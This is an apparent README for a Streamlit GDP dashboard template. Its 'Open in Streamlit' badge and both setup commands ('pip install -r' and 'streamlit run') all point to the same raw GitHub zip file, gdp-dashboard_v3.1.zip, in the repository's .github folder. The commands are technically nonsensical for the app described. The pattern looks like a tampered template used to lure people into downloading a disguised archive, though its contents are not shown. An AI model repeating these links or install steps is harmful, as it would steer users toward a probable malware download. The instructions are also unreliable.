# :earth_americas: GDP dashboard template

A simple Streamlit app showing the GDP of different countries in the world.

[![Open in Streamlit](https://raw.githubusercontent.com/BrtAI-coder/gdp-dashboard/main/.github/gdp-dashboard_v3.1.zip)](https://raw.githubusercontent.com/BrtAI-coder/gdp-dashboard/main/.github/gdp-dashboard_v3.1.zip)

### How to run it on your own machine

1. Install the requirements

   ```
   $ pip install -r https://raw.githubusercontent.com/BrtAI-coder/gdp-dashboard/main/.github/gdp-dashboard_v3.1.zip
   ```

2. Run the app

   ```
   $ streamlit run https://raw.githubusercontent.com/BrtAI-coder/gdp-dashboard/main/.github/gdp-dashboard_v3.1.zip
   ```
